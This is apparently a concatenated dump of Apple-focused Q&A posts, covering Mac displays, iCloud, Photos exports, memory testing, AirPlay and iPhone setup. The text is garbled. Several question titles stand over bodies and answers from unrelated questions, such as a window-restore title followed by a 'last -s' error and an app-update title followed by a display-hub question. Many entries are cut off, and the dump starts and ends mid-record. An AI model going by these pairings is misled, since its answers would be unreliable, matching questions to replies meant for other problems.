The model numbers are different though.\nThe old 5K version had model number 27MD5KA, whereas the new version has model number 27MD5KL.\nThe new 5K version adds support for USB-C - the old version supported only Thunderbolt 3. This is probably not a big deal for Mac users, but if you have an iPad Pro it means that you can connect the iPad Pro directly to the display over USB-C.\nIn addition the new 5K version ups power delivery over Thunderbolt 3 to 94 watt from 85 watts. It's probably not important for most, as 85 watts is enough to charge a MacBook Pro.\nAll in all relatively minor changes, but only for the better.\nThe 4K version is a different deal though. The new revision is basically a completely different display. The size has increased from 21.5\" to 23.7\" while the resolution was lowered from 4096x2304 to 3840x2160. In addition, the 4 USB-C ports on the old display has been changed to 3 USB-C ports and 2 Thunderbolt 3 ports with the latter supporting 85W of power delivery in total.\nThe old 4K version had model number 22MD4KA-B, whereas the new version has model number 24MD4KL.\n", "Q: How to get back old configurations of app windows if lost because of reboot?

But when I execute this command on a Mac I receive an:\nlast: illegal option -- s\nusage: last [-#] [-t tty] [-h hostname] [user ...]\n\nThis is not how it is supposed to work. \nWhy -s is not recognised? \n\nA: \nAlways use man X directly on the Mac itself to see what is available for command X.  The reason is that OS X was originally based on BSD and not GNU (most likely to avoid the GPL) so you should not follow Linux tutorials for MacOS.\n\nA: The 'last' command on a Mac has no -s option. Not all Unix commands are implemented the same on a Mac. Mac tends tends to use original BSD commands.  As to why 's' isn't an option on the Mac, according to @Mark, it may be due to the difference in BSD (Mac) and GNU (Linux). There are most likely differences between the two.\n", "Q: Disable update for one app on iOS How to make one app never update? It's the old Ingress version.

I have a LG display which supports 4K at 60 Hz. I wanted to buy an adapter for my Macbook Air(2018) to use it with my notebook. I am confused about one thing though. I have read that USB-C to USB-C hubs don't exist. So, am I limited to using the one free port left after using one for power to be either occupied by DisplayPort adapters or something else one at a time?\nI have seen that Apple and some other manufacturers have a USB-C to multi AV adapter which has HDMI and USB-C both as output but can't find one for DisplayPort. Is this because of higher requirements of the DisplayPort 1.3+ standard which allows it to do 4K 60 Hz not leaving bandwidth for multiplexing the port?\n\nA: The 2018 MacBook Air actually has 2 Thunderbolt 3 ports. I.e. they not just USB-C ports.\nThis mean that you can definitely connect all sorts of multiport adapters, docks, etc. to enable you to charge the Mac while connected to a DisplayPort monitor - and then even more.\nJust as an example you can use the OWC Thunderbolt 3 dock and connect that to one of the two Thunderbolt 3 ports on your MacBook Air. It comes with a power brick that will charge your MacBook Air through that single cable. In addition it has a 4k at 60Hz DisplayPort output (you'll need a mini-DisplayPort to DisplayPort cable). \nThis leaves you with one of the two ports on your MacBook Air unused - as well as providing lots of extra ports on the dock itself (5 x USB 3, 1 x USB-C, 1 x daisy-chained Thunderbolt 3, ethernet, S/PDIF, audio-jack, SD-card and micro-SD).\nIn fact you could also use the daisy-chained Thunderbolt 3 port to hook up the monitor - then you would require a USB-C to DisplayPort cable instead.\n", "Q: iCloud use as storage and not \"reflective\" like dropbox I hope this hasn't been asked exactly like this before. I tried to do a search. \nI am referring to my MacBook (but I think the same is at least partially true for other devices as well).\nI checked \"optimise storage\" so that it will leave some space on my Mac. \nI need more storage on my Mac because some apps like Xcode cannot be updated with just 25GB left on the SSD. \nSo - please let me know if this is true: ONLY desktop and \"document\" and their subdirectories are reflected back to my MacBook. Is this true. If so this implies that if I make another folder on iCloud like \"Documents2\" and push a lot of stuff that I don't daily need or want into that folder - this will NOT be copied over to my Mac, even if there is enough space? \nIs this correct?\nThanks,\nJeff\n\nA: iCloud is not 'storage' it is 'data distribution'.\nIt isn't designed to 'keep things on', it's designed so that whichever device you pick up, you have access to the same files.\nThe closest it comes to being 'storage' is if you have a small, overloaded drive it will start to offload such as full-size images, leaving smaller versions locally.\nPurely personal opinion:\nMany people were sold laptops with far too little drive space on them & are now paying the price for economising/marketing strategy.\n256GB is absolute bare minimum, imnsho, & 128GB is simply not enough for much more than the OS. \n", "Q: Recover photos from thumbnails in Photos app When I open some of my pictures in Photos app, an error message occurs: \"the volume cannot be found\".\nThis is because the pictures were \"imported\" from the desktop on a previous computer and Photos didn't make a copy of them (the setting was disabled).\nThese original files were lost, however Photos is still able to display a large preview (which actually doesn't seem smaller than the original picture).\nWhere can I find the picture files behind Photos's previews, so I can reimport them correctly?\nI've tried finding a preview file location field in Photos's sqlite database (Photos Library.photoslibrary/database/photos.db) but with no luck.\nEDIT : I am technically savvy and can use the Terminal for file search, querying a sqlite database like the one mentioned above, or other tasks.\n\nA: The photos are stored in:\n~/Pictures/Photos Library.photoslibrary/Masters/\n\nTo get there go to your Pictures folder in your users directory and right click on your photo library file. Then right click and select  “show package contents”  I’ve seen the same photo in a variety of sizes in multiple different locations within the photos library.

Is there a way to avoid updating when I choose the restore option only? I already search all the solution online yet no answer help my concern.\n\nA: You can here: https://ipsw.me/ find the old restore images (the image will be downloaded from Apple's server), which you from iTunes can use for the restore.\nTo use the downloaded .ipsw file, you hold down the \"Option\" key, then click \"Restore iPhone\" in the Summary page in iTunes.

I have a MacBook Pro with a single SSD installed - the disc is called “my favourite name”\nI just purchased a new larger ssd which I want to install instead of my old ssd.\nWhen I format the new drive can I name it “my favourite name” ? What happens if I try to use migration assistant to migrate files from my backup of my old ssd called “my favourite name”?\nHow do I successfully transfer my files, and ensure my new ssd is also called “my favourite name”\nEdit: just to clarify - this is a laptop. I remove the old drive and install the new.\n\nA: The name is relative and you can change it later. Just name the new drive new and use it for a week or day. Once you are ready to shift, name the old one \"old\" and put the name you want for new.\nOr rename the old one before you introduce the new one.\nThis works out of the box, so I'm guessing you might have some other constraint that needs to be discussed, but perhaps you didn't know you could rename things on the go.\nAlso - never remove a working drive to swap until you’ve already set up the new drive externally and tested booting from the external drive. Then you know it’s bootable and working and if you put it inside, you know the fault is always the cable and installation - you don’t have to wonder if the OS wasn’t OK or drivers, etc...\n", "Q: Use an iPhone as a live system monitor A while ago, I was eyeballing the MadCatz STRIKE7 keyboard for a new gaming PC I was building...but as it turns out, its not just sold out, EOL'd but also quite hard to get a hold of.

I wonder, is there a standalone version of this? A secondary display solution which just gives me some numbers to gawk at, like CPU and GPU temperatures, RAM usage and alike?\n\nA: Check out Pulseway.

I've been using it for a couple of hours before plugging it in for the very first time as it told me that it still had plenty of battery power left. I was surprised that it seemingly did not deplete, until the device shut off suddenly due to a completely emptied battery.\nWhen plugging it in and restarting it, the battery icon in the menu bar said \"Service Battery\". Upon googling the problem I found out that resetting the SMC is a popular first trouble shooting step. However, a reset did not change anything, the warning remains.\nDo you have any additional suggestions for me? I'd hate to take it back.\nUpdate: After charging it to 100% I took it off the charger and the warning eventually disappeared. It's still on 100% though after having worked on it for about 3 hours.\n\nA: If this happens with a new MacBook Pro, you will want to call the seller and arrange for a repair or a device replacement.

Just don't know if the appstore will allow phones that aren't running the current OS to go on it\n(I'm really only interested in this app - https://www.literatureandlatte.com/scrivener/overview )\n\nA: Yes, the App Store is certainly supported on the iPhone 5S.\nNote that the iPhone 5S does not supported the just released iOS 13 release. This means that apps that require iOS 13 or later won't be installable on the iPhone 5S. For the moment, only very few apps require iOS 13.\nIf an app does require iOS 13, and is not available for download, usually the publisher will let older versions of the app that does not require iOS 13 to be available for download on those older devices.\nThe app you mention (Scrivener) only requires iOS 9 - so it's not going to be a problem for you to download and run this app on the iPhone 5S. In the future it might be that you cannot update to the latest version of the app, if they release a version that requires iOS 13 though.\n", "Q: Problem with building project by CMake I have installed gcc and g++ instead of clang compilers from Xcode, so now I have problem with compiling with cmake.

My 2015 MacBook air (my first mac) actually got around 12 hours battery while using node, chrome, and sublime text (my usual tools at the time). I use to brag about it all the time and wouldn't plug it in until i was down to 5% battery. My 2015 model doesn't run as long as it did in 2015-2017 so i purchased a new one a month ago. \nAfter a month of getting settled in with the 2019 mac I realize either the battery performance is lower quality, OS is sucking more resources in the background or my tools (node, chrome, and vs-code) are sucking more power.

Excessive power consumption when the system is sleep was never a problem on my 2015 MacBook Air but it's a problem out of the box on my 2019 MacBook Air. Are there any new strategies for resolving this on newer macs? Do the old tricks apply to new macs? \n\nA: A while back Apple introduced something called \"Power Nap.\"\nBasically your Mac will still do some background tasks while asleep. I am guessing that this might be what is going on.\nGo to \nSystem Preferences > Energy Saver\nand look for \"Enable Power Nap while on battery power.\"\nI would guess that it is checked, un-check it and see if that helps. \nAlso there is a good shareware app out there called Coconut Battery that will give you some detailed info on battery health and usage, you may want to look into that as well.\n", "Q: Shortcuts App (iOS 13.1.1): How can I realize a text output in a bigger font size, a specific color, font-weight, ...?

With the goal of recovering storage space, I attempted to delete the Apple TV App. This app was still taking up 490MB of \"Documents and Data\" storage after I deleted all videos I could manually delete (the TV app libray screen said \"You don't have any videos.\") However, deleting the TV app only changed it to \"Videos\" which still takes up 490MB of \"Documents and Data\" storage.\nThere is no option to delete this \"Videos\" pseudo app. As far as I can tell, there is no actual \"Videos\" app I can start from the home/search screens.\nI also tried to locate the media file(s) taking up storage via iTunes. There was one file under \"Movies.\" There was no option to delete this file from iTunes. I think I uploaded the file to my iPhone via CopyTrans Manager. So I tried deleting the file via CopyTrans.\nNow the file does not show up in iTunes or CopyTrans, but the \"Videos\" app still consumes 490MB of storage. How do I recover the 490MB of storage taken up by the \"Videos\" app?\nI have a feeling this file was orphaned somehow because it was uploaded a long time ago on different versions of iOS/iTunes/copyTrans before the Videos app became the TV app.\nI read syncing may result in files that cannot be deleted.

At this point any interaction is with the entire message. If you directly double click or right click whilst the text is initially black, it doesn't go to grey, you can interact directly.\nBasically, don't do that first click. You can do anything else & it works as individual words - so right click, double-click or click-drag works, for instance.\nIf you click outside the message bubble, the text goes back to black & you can now interact like any ordinary text.\nBTW, verification codes like that will be found by Safari & will click right into the web page.\nExamples\n\n*\n\n*Grey text - handled as a single item for copy/paste.\n\n\n\n*\n\n*Black text, can be individually selected.\n\n\n\n*\n\n*Same in dark mode (first message is selected)\n\n\n\n*\n\n*Smart fill-in feature in Safari\n\n\n\nA: Looks like it was a bug.\nI restarted Messages.app and now it works as expected (and as it should have done in the first place)\n\nI'll keep an eye out and edit this answer if I figure out what causes the bug.\n\nA: This answer assumes that you haven't clicked on the message to make it selected and thus light grey. \nI do right click and it selects the word.

Correctly, when logging in, I am receiving the SMS with the code to my phone (not Apple) for the 2FA, but then the procedure tells me every time to go to another device signed in to iCloud and approve the current MacBook. Only at this point, in both the accounts, I can see that this new MacBook has been added again to the devices section.\nAs you can imagine, I do not have any other Apple device to approve this new MacBook and the solution proposed else where in this website, are not helpful because they suppose you have another Apple device or they just say what I have already tried and wrote above.\nIs there anything that I can try about that?\n\nA: This is an iCloud keychain prompt. In order to allow you to sign in to the Mac, you'll need to approve it. If you only have one device on the account then you must have had another apple device in the past that you used to set up keychain. Often times some users will turn keychain on and then realize they don't know what it is or what it does so they turn it off. The moment its turned on, you activate it and it identifies itself with your Apple ID. \nIf you don't care about iCloud Keychain, the screen should get you an option to reset iCloud Keychain. It should say \"Can't approve from another device\". Once you click on that, next it will say \"If you can’t approve this Mac from another device, you can reset your end-to-end encrypted data to finish setting up iCloud\". That data is your keychain passwords, wifi passwords, Messages saved in iCloud and credit card numbers (more info below). If you don't care that it will erase that information from your account, then have it reset the keychain and it will allow you to continue to the phone setup.\niCloud keychain is a secure management feature that keeps your account names, passwords, Messages in iCloud and even credit card numbers stored behind 256-bit AES encryption on Apple's iCloud servers. Then that data is synced between authorized iOS/iPadOS devices and macOS devices.\n", "Q: How to enable the iPad QuickType \"Floating Keyboard\" mini keyboard? The iPad now contains a mini, draggable, floating keyboard as an alternative to the full screen keyboard. This was released in iOS 13 / iPadOS 13 in September 2019.\nThis mini keyboard is roughly the size of an iPhone keyboard, but floating on your iPad's screen.\nFrom the iPadOS release notes:\n\nQuickType\nNew floating keyboard leaving more room for your content—drag it anywhere you like\n\nand Features:\n\nFloating keyboard\nPinch to shrink the QuickType keyboard and move it wherever you want so there’s more room for your apps.\n\nHow do you enable this iPad mini floating keyboard?\n\n\nA: Tap and hold the \"Dismiss Keyboard\" button in the bottom-right corner of the default iPad keyboard.\nYou will see a \"Floating\" pop-up. Select this action to activate the Floating keyboard.\n\nTo return to the standard iPad keyboard, grab the Floating Keyboard's drag handle and drag the keyboard to the bottom of the screen.\n\nA: How to turn on iPadOS 13’s floating keyboard\n\n\n*\n\n*Open any app where the standard iOS onscreen keyboard appears.\n\n*Once the keyboard appears, use your thumb and index finger to pinch the keyboard. This works in any orientation and in any spot, so long as both fingers are on the keyboard interface.\n\n*The keyboard immediately shrinks down a shape and size that resembles an iPhone keyboard.\n\n*To move the keyboard, press down on the bar at the bottom of the keyboard interface and move it as needed.\n\n*To return the keyboard to its default orientation, pinch outward on the keyboard interface.\nAlternatively, while the iPad is in its default screen-wide configuration, you can hold your finger down on the key with the keyboard icon in the lower-right and pressing the Floating prompt that pops up like @pkamb shows you above. You’ll still have to pinch outward to close the keyboard, though.\nNote that the keyboard will stay in the last mode and orientation you left it in regardless of which app you’re using.\n", "Q: Customizing touch bar word predictions Is it possible to change/modify the word prediction engine used by Apple in its touch bar predictions? \nFor example, can it be replaced by Google's auto-generated suggestions (similar to what's on Google Keyboard) or modified in a way such that I can add words to the dictionary from which words are predicted?\nThe default touch bar predictions don't seem to learn much from what I type on my keyboard. I personally find Google keyboard suggestions (on smartphones) much better as compared to ones on the touch bar. I am a new macOS user and I am not sure if Apple allows one to do this.\n\nA: Assuming it to be same as the one in keyboard predictions on iOS, Apple would have put poor Siri's name for this tool too. The best way I found to train it is to use it multiple times. For a persistent error, text replacement to the rescue.\nWhere does Apple's predictive keyboard get its “contextual” content from?\nThis question is for iOS, but it's not unreasonable to assume that prediction algorithm can be same in both places. \n", "Q: How do I permanently disable logging in Outlook 365 for Mac I ran into an weird issue today when I was prompted that I was running out of space on my disk.  Digging into the issue I found that Outlook has been generating a debug log so much that it chewed through almost 200GB of data in plain text. \nWeird thing is logging is not enabled when I checked the settings and I can't seem to find an answer as to why it keeps generating the logs.  Deleting the log, stop, and then start Outlook again creates a new log file that hits over 200MB in less than 6 minutes. After about an hour it became over 1GB already.\nHow do I stop this non-stop generation of logs? \n\nA: To disable logging:\nRestart Outlook and when prompted to turn off logging click \"Turn Logging Off\" \nIf you disable logging manually you must restart Outlook to fully disable logging, otherwise, it will continue logging in the background\n\nA: So my issue ended up being a borked forced profile from work that they're refusing to fix since I'm using Office356 instead of OpenOffice.  Something they set is forcing debug logging to be enabled but not show as being enabled in the setting....\n", "Q: When using dual monitors, is it possible to get the screenshots to appear on the desktop of the screen it captured? I'm not using a mirrored display, I connect my monitor to my laptop to do my main work and use my laptop for keeping track of queues and emails.

The screenshots always stay afterwards on my monitor desktop. \nIs there a way to there a way to change the screenshot default so that it appears on my external monitor desktop when I snap something on it?\nOr maybe change the default \"desktop\" to be my monitor?\n\nA: Files sent to Desktop will always land on the right side of the primary display - under your disk drives if you have them showing. \nYou can change which screen is primary, & though I can't test as I don't have a laptop, the primary is very likely to reset to internal every time the external is unplugged.\nChange primary by dragging the white menu bar segment as shown below \n\n", "Q: How to quickly switch between two versions of a file In more detail, I need to have a simple command or something else that I can trigger that will switch a certain file between two versions.

The file needs to stay in its current location, with the same name, just some of the contents need to be adjusted. \nIs there a quick way to do this?\n\nA: It sounds like you need to have the files open in an editor that will display both files at once or have windows for each file. 2 editors I know of are Atom and Visual Studio Code.

I tried Memtest but it won't boot from a thumbdrive for some reason. \n\nA: Use Apple Diagnostics. Its an Apple-approved method of checking your memory and other hardware parts of your Mac. You can restart your Mac, then hold down D as soon as it restarts. If you did it correctly, your computer will either boot into Apple Diagnostics or Apple Hardware Test, depending on the age of your machine. Then just follow the prompts. \n\nA: You probably didn't set up Memtest properly. Here is how:\nCheck Your Memory Using MemTest86\n\nIf you want to learn more about any problems Apple’s diagnostics detected, or you want to run another test for peace of mind, MemTest86 is one of the best tools for the job. There are a few memory testing tools that use similar names, but MemTest86 is still regularly maintained and updated.\nTo test your machine, you’re going to need to make a bootable USB drive from which to run the test. The first step is to find a suitable USB drive and make sure there are no important files on there since the whole drive will be erased. Insert the USB drive into a free port.\nNow download the free drive creation tool Etcher, mount the DMG, and install it to your Applications folder. Head to the MemTest86 Downloads page and grab the Image for creating bootable USB Drive under Linux/Mac Downloads.\nOnce MemTest86 has downloaded, extract the archive and launch Etcher. Click Select image, navigate to the extracted archive you previously downloaded, and choose the memtest-usb.img file. Now click Select drive and choose the USB drive you want to use. When you’re ready, click Flash! and wait for the process to complete.\n\nNext, shut down the Mac you want to test and insert the USB drive you just created. Press and hold the Option key and power on your Mac. When prompted, select the external drive you created (it may show up as EFI Boot) by clicking the arrow to boot into MemTest. Don’t select Macintosh HD, since this is your internal drive.\nWait for MemTest86 to initialize. Testing should begin after a short pause, but if it doesn’t, select Config then Start Test. Allow time for the test to complete; it took around 40 minutes on our test machine. In the end, you’ll be given a summary, and an option to save a report to the USB drive in HTML format.\n\nSave the report if you find anything unusual and use it to seek help from an Apple technician or Apple Support.\n", "Q: Will using Airplay with local files sent to AppleTV (2nd Gen) count towards data allowance from ISP? I am considering getting a cheap AppleTV 2 just to stream local music and video files but have not found a clear answer if Airplay will use my monthly ISP data allowance. Thanks\n\nA: AirPlay is a peer to peer networking protocol, so it works even if you have no internet connection. In most cases, you don't even need WiFi for AirPlay to work so if you're really concerned, you could shut down WiFi or unplug it from the router entirely and check that things work.\nAirPlay doesn't disable any background downloads or connections, so you could still use data while you AirPlay, but it's not because of AirPlay\nGood discussion of AirPlay and LTE/Cellular data is on this thread, but your question is different in that it's more about WAN/LAN than a cellular link:\n\n\n*\n\n*Can I use 4G LTE (Cellular Data) and Airplay using Wifi w/ No Internet connection at the same time?\nIt does reinforce the \"downloads can happen\" aspect as well, but hopefully makes it clear the AirPlay is purely peer to peer and not routed traffic out a gateway be it WiFi or LTE.\n", "Q: How do I check all boxes in Alfred Snippets?

Last week, I upgraded from iOS 12 to iOS 13 on my iPhone XS - all was fine. Due to upgrading to an 11 Pro, I then made an iCloud Backup on my XS, and then restored to the just-created backup on my new 11 Pro - again, all fine.\nSince that time, however, I've noticed that I'm not receiving push notifications for the majority of apps that I have installed on my new 11 Pro - the only apps that appear to be sending me notifications are the ones that I've deliberately opened manually from my home screen - apps that I haven't yet opened since restoring from my iCloud Backup arn't producing anything - it's worth noting that they were working as expected after upgrading from iOS 12 to 13 on my XS before erasing it. So - things that I've tried so far:\nRebooting the phone\nChecking the \"Notifications\" screen from within Settings.app - all notification settings are as they should be, and are enabled for apps that arn't currently producing them\nThings that I deliberately haven't done yet:\nRemoved the apps that arn't currently producing notifications; I have a lot of these, and don't want to spend time re-organising my Home screen folders if I can avoid it!\nOpening each app at least once to see if this begins to generate notifications (see my reasoning below for this)\nSo - my question. Upon restoring from an iCloud Backup, is it necessary to first open each app individually to force notifications to come through as they were doing before I restored? I have a lot of apps, but would prefer doing this than reinstalling them all individually. I don't remember having to do this when upgrading from my old iPhone 7 to the XS last year; I don't completely understand how APNS works, so can't figure out if my tokens will still be valid from my old iPhone or whether there's a simple solution to this that I just haven't tried yet. I'm not sure if the opening each app approach will work; I opened the Stack Exchange app upon restoring from iCloud to enter my login info, but as of yet haven't received any notifications - I know for a fact that I would have; I have new items in my Inbox that haven't come through as a notification on my new 11 Pro.\n\nA: So - to answer my own question. It appears that after restoring from an iCloud Backup (I haven't been able to test with iTunes), that you have to open each app that you were previously receiving notifications for before restoring at least once - not performing this step means that they simply arn't generated, even though they're listed as being allowed to send notifications when checking from within Settings.app. I'm not sure why technically this happens - maybe somebody else has further insight which would be useful.\n", "Q: Is there still integrated login on the iPhone for Google, Facebook, and Twitter? It seems that since iOS 11, integrated login for Facebook and Twitter was removed (which was introduced in iOS 6).\nWhat about for Google?\n\nA: Yes, Apple has removed the Facebook and Twitter integration starting with iOS 11.\nGoogle integration has never been available in iOS in the manner similar to how Facebook and Twitter was. However, it has been always possible to add a Google account on your iPhone to access Mail, Contacts and Notes within the 1st party apps. The option can be found Passwords & Accounts section of iOS Settings app.\n\nA: Was Google ever officially integrated for login?\nApp Extensions\nApple now recommend third parties implement app extensions to share and integrate into iOS.\n", "Q: Is it true that if I let Google Photos store all photos, then I can back up to iCloud with minimal storage? Is it true that on the iPhone, most things that really need to be backed up, except photos and videos, are the phone contacts, Notes, calendar, and data that may not even need 100MB?\nSo if I let Google Photos store all my photos and videos with unlimited storage and \"good quality\", then I can let one or multiple iPhones / iPads back up to iCloud with the 5GB free plan?\nWhat may the settings be to choose which to back up to iCloud? For example, for emails, those don't really need to be backed up because they are on the email server anyway?\n\nA: There are 4 questions here.\nHow can one answer 1st one without going to opinions? If you don't feel that those notes etc., are important, better to save bandwidth and space. \n2nd also depends on how much is your rest of the backup. One can also have no documents, huge media collection or vice-versa. I am running 5 GB and I put less urgent/ important photos on Google Photos. iCloud is used for documents also but they're more or less distributed over accounts. \n3rd: It's up to you to decide. You can test and verify which settings work best for you. If something piles up, decide whether you really want it synced or not.\n4th: I doubt that all emails(in non-Apple accounts) are backed up by iCloud. Only iCloud emails count against iCloud Drive quota. \n", "Q: Ask siri to set alarm silently?

Does not seem to effect OSX 15.5.\nVery usable free connection Wi-Fi on DB gotta love German trains!\n\nA: For me, adding the DNS 172.18.0.1 worked (saw it on my android on which the WiFi was working fine).\n\nA: I encountered an issue where I was able to connect to the wifi network 'WIFIonICE', but the pop-up to accept the privacy and terms of service did not appear.\nTo resolve this issue, I found that keeping the connection active and going to the wifi settings, then clicking on DNS, and removing any existing DNS (such as 4.4.4.4 or 8.8.8.8) allows the network to assign its own DNS to the system/connection.\nAfter that, opening the website login.wifionice.de in my browser allowed me to successfully connect to the wifi.\n\nA: If this happens, it is usually one of two things:\n\n\n*\n\n*The connection itself is flaky\n\n*The Macbook did not „pick up“ the login page\n\n\nFirst check if your WiFi is connected (connection Symbol and no exclamation mark). If it is, open your browser and go to http://neverssl.com - this should usually get you the login page.\nThese steps should also work for other networks that require a login.\nIf it does not connect, the train‘s system may be offline...\n", "Q: How can I adjust the sequential numbering scheme when exporting Photos? I'm trying to export ~200 or so photos from Photos.app to setup on a digital picture frame. These photos are in an album, in sequence, and I can export them in numbered order from Photos.\nHowever, Photos exports using the following format:\n\"Filename - 1\"\n\"Filename - 2\"\n...\n\"Filename - 10\"\n\"Filename - 11\"\netc.\nMy digital frame does not understand that 10 does not come before 2, so it plays back as 1,10,11,12...20,21\nThis ought to be solvable by having the Photos export using a format of 001,002,003, etc. I'm pretty sure iPhoto used to even let me do this! But I can't find any option to do so in Photos.\nIs it possible to export using a sensible number order that my frame will understand?\n\nA: Select the photos to export and then press: ⇧⌘E \nIn the Export sheet, select the Photo Kind: and then select Sequential for File Name:, while leaving Sequential Prefix: blank, and Subfolder Format: to None.\nClick the Export button.\nSelect a location for the photos to be exported to and click the Export button.\nFor the number of photos you mentioned, \"~200\", this will take a little while.\nWhen the exporting is finished, then in Terminal change directory to the location of the exported photos.\ncd /path/to/exported/photos\n\nThey will be named e.g. 1.png, 2.png, etc.\nUse the following compound command to rename the files for a three digit zero padded filename.\nfor f in [0-9]*\\.*; do mv -v -n \"$f\" \"$(printf %03d \"${f%.*}\")\".\"${f##*.}\"; done\n\nThe files will now be named e.g. 001.png, 002.png, etc.\n\nA: After exporting files into a new folder, go to Finder, open that folder, and select all the photos you want to rename. Once they are selected, right-click on your selection and you'll see an option to \"rename xx files\" where xx is the number of files to rename. Click that option and you can input the files name and sequential number. Below shows the panel you get when you select 9 files and right-click on the files.\n\nNow when you click on \"Rename 9 items you get the panel shown below.\n\n", "Q: Magic Keyboard + Windows 10 -- disable fn lock? I have used an apple wireless keyboard (not the \"magic\" variety) for some years on my windows 10 running on a macbook pro. I upgraded to the Magic Keyboard and I am seeing a strange behavior. \nIn windows fn + left/right arrow is the equivalent of the home and end respectively. Additionally, if I do that same combination but add shift, so, fn + shift + left/right arrow, I can highlight the entire line. Very handy!\nOn the new Magic Keyboard, when I do fn + shift (with or without arrow keys), it locks the shift and it acts as if it is being held down until I press shift again. In fact, this works with control/command as well.\nDoes anyone know how to disable this functionality? I think this is maybe called fn lock but googling it so far has been unfruitful.\nThanks!\n\nA: So, I couldn't tell you why or how, but I downloaded this software: \nhttps://magicutilities.net/download\nAfter installing it, this \"feature\" went away and the fn key no longer caused other modifier keys to become sticky. Downside is there's a yearly fee for this software, so if anyone has any other ideas I'd love to hear them!\n", "Q: Notifications from Apple on MacBook air So, I tried to install newly purchased iPhone 5 and after logging into my apple ID account, a pop up message notified me that a verification code has been sent to macOS Sierra, where can I access the code on my laptop?\nFurthermore I cannot now even verify the account because it is impermanently blocked as I tried too many times to enter a password for my Apple ID. Now I remembered it btw. So, to reset the apple ID password they ask me to enter a password for my macbook AIR, I am very sure of the password because I use the laptop every day, but when I enter the MacBook password the pop up message gives me an error and notes, that the entered password is incorrect. Do I even understand correctly that I need to enter the password which I enter when try to log into my computer, is there any other password am not aware of? \nNow I manage to log into the phone and install different apple ID, but I have a problem to reactivate the old apple ID on my mac and also the phone, because on both devices they ask to verify the code sent to the other device, which I cannot access.\n\nA: I've had multiple Mac computers and iOS devices and when I get a new device I get a pop up similar to what you mention (it just appears on the screen, as shown in the image below -- so I don't have to \"do\" anything). I have 2-factor authentication enabled, and you may check if you do as well. This site has more details.\n\nYou write that you are asked to \"enter a password for my macbook AIR\". That may be true, but also be careful to distinguish between the verification code they send and your MacBook Air login -- two very different things, and if you confuse one for the other I could imagine the frustration.\nYou may also find this page helpful as it specifically deals with Apple ID sign-in on different types of devices and (at the very bottom of the page) gives links to help in the situation you describe regarding forgetting your Apple ID.\n", "Q: Why does updating Xcode make my computer so slow?

Is there any risk to using a previous jailbroken iPhone after doing a wipe and install of an all-new iOS? \nMy Question here is similar to: Steps after buying a used iPhone. But that Question focused on practical issues. My Question here has a focus on security.\nThe only to-do item I know is to check for the Activation Lock feature being enabled. Apple describes how to do this. Any other to-do items?\n\nA: \nI intend to immediately wipe the phone by using iTunes to install a fresh iOS, as a clean install.\n\nThat should be the only major step required. Do a clean iOS install (or factory reset the device). Make sure to install the latest public version of iOS supported by your model of iPhone.\n\n➥ What else should I do to address security concerns?\n\nInstalling the latest public iOS release should take care of the security concerns whatsoever. You can further ensure if no 3rd party/unauthorized part replacements have been made. The iOS should be able to detect if any crucial components such as Home button or battery has been replaced by unauthorized means.\n\n➥ If this phone had been through a jailbreaking, is there a way for me to tell?\n\nNo if the device has been reset to remove the Jailbreak.\n\nIs there any risk to using a previous jailbroken iPhone after doing a wipe and install of an all-new iOS?\n\nNone if you reinstall iOS which effectively removes the jailbreak.\n", "Q: Can I charge a MacBook Air using the Thunderbolt 1 port? I have a 2013 MacBook Air that is not charging. I suspect that the problem is the MagSafe port (or, more likely, the I/O board). An iFixit Answer implies that it is possible to charge it using the Thunderbolt port. Is this true? And if so, what cables would I need to actually be able to plug it in?\n\nA: No, Thunderbolt ports cannot be used to charge pre-USB-C MacBooks.\nIf this were possible, the Apple Thunderbolt Display would surely have shipped with only a single Thunderbolt cable rather than its Thunderbolt + MagSafe hydra:\n\n", "Q: How to prompt Safari to save website's username and password to keychain?

My wife and I both take pictures on our iPhones. We have our own iCloud accounts. Sometimes we want to make albums of pictures selected from both our accounts. What is the easiest way to share high resolution pictures from both of us?\nApple's photo sharing seems to have some significant downsides:\n\n\n*\n\n*Shared photos are not full resolution (i.e., when we try to print them out, they're blurry)\n\n*Pictures must be manually added by each person (and I'm lazy and don't always add mine)\n\n\nSome possibilities I've thought about:\n\n\n*\n\n*I don't know of a way to do it on a Mac, since the Photos app, as far as I can tell, can only access one iCloud account per Mac account. Tying to a Mac account means I need to log out of one account (which is a major hassle since everything we do is on one Mac account) in order to view the pictures from the other.\n\n*From one Mac account I could load the other library in a icloud.com browser window. This at least I can have them available concurrently, but they're not collated.\n\n*I'm sure most people, including us, have multiple devices and that enables viewing photos concurrently. But when, for example, preparing a photo album, you now need a way to transfer the original photos from one device to the one where the album is being prepared.\n\n*I don't know/think I want both of us to use the same iCloud account... because that ties everything we do together, e.g., we'd receive each other's text messages etc?\n\n*I could create a 2nd Mac account, have it download all the photos from the 2nd iCloud account. Then export them to a shared directory on the Mac, import them into the primary account. This would mean that the photos are either duplicated or removed from the original iCloud account, neither of which are desirable, besides being a bit time consuming as well as potentially deleting photo origination information.\n\n\nThis seems like a very desirable feature for families that a lot of people can't figure out. I realize that Best way to share all photos with partner asks more or less the same thing, but things may have changed in the meantime.\n\nA: This is an answer, but not the answer either of us want: no, it's not possible to do what you're looking for.\nMy wife and I have our own Apple IDs. We want to be able to automatically see all of each other's photos since 99% of our photos are of the same events and the same subjects (our children). We don't want to have to manually move/share photos, which means that Family Sharing Album is no good (and it also has a max photos limit).\nThe only way we've been able to solve this problem so far is to not use iCloud Photos at all. Instead, we have a shared Google Photos account and we both have that set to automatically upload all our photos there.\nIf I want to look at photos I just use the Google Photos app, and I'll see all the photos both of us took at the same event. It's a shame I can't stick to iCloud photos for this, but c'est la vie!\n", "Q: Programing Language availability for a Mac I want an inexpensive programming language for my Mac. I know Pascal, Fortran, some familiarity with C. I don’t know many recent languages but am willing learn. I just have a Mac , and I want to experiment with programming again after decades of not doing much. In the future, I might want to do I/O to external devices.\n\nA: Most languages are available to learn on a Mac. To my knowledge, most are free or fairly cheap. You can use gcc as a C and Fortran compiler. gcc is free. I program in Fortran and python. Python is free. And Swift is a popular language to program a Mac or iOS device. The popular editors, Atom and Visual Studio Code, are both used to program in many different languages. The editors have add-on extensions to program these languages. There are extensions for Ruby, python, Fortran, c, javascript, java, Perl, PHP, Lua, and others.\n", "Q: iPadOS Where has Find Friends gone? I just updated my iPad to iPadOS13.1.2 and can't find some of my apps.\nI used to use Find Friends - but it seems to be missing in action.\nI can't even figure out how to search on the iPad\n\nA: The app is renamed “Find My” and you can use Siri to locate it if your spotlight search is messed up or just updating after the update.\nNot all of Apple’s documentation online is updated yet, but here’s a 